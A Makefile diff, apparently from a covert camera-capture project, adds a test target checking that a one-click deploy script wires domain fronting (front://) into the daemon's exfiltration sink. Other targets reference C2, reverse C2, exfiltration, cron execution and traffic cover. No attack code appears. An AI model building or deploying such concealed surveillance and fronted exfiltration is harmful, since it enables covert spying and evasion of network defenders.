@@ -259,7 +259,15 @@ verify-cron-exec:
 verify-onekey-arch:
 	@python3 tests/verify_onekey_arch.py
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-cron-exec $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
+# 一键脚本的域前置（front://）接线：能力在 camd 里做出来，不等于部署脚本
+# 接上了。本目标断言 front 模式产出 front:// sink、真实目标与 CA 进入
+# CAMD_EXTRA、且 CAMD_EXTRA 带引号（实测缺陷：无引号时 conf 被 source 成
+# "临时环境变量 + 执行命令"，参数静默丢失）；另配两条反向注入与三条静态
+# 断言，防"另写一份硬编码 sink"重新发散。
+verify-onekey-front:
+	@python3 tests/verify_onekey_front.py
+
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -283,4 +291,4 @@ inspect: all
 clean:
 	rm -rf $(BUILD)
 
-.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-cron-exec
+.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec
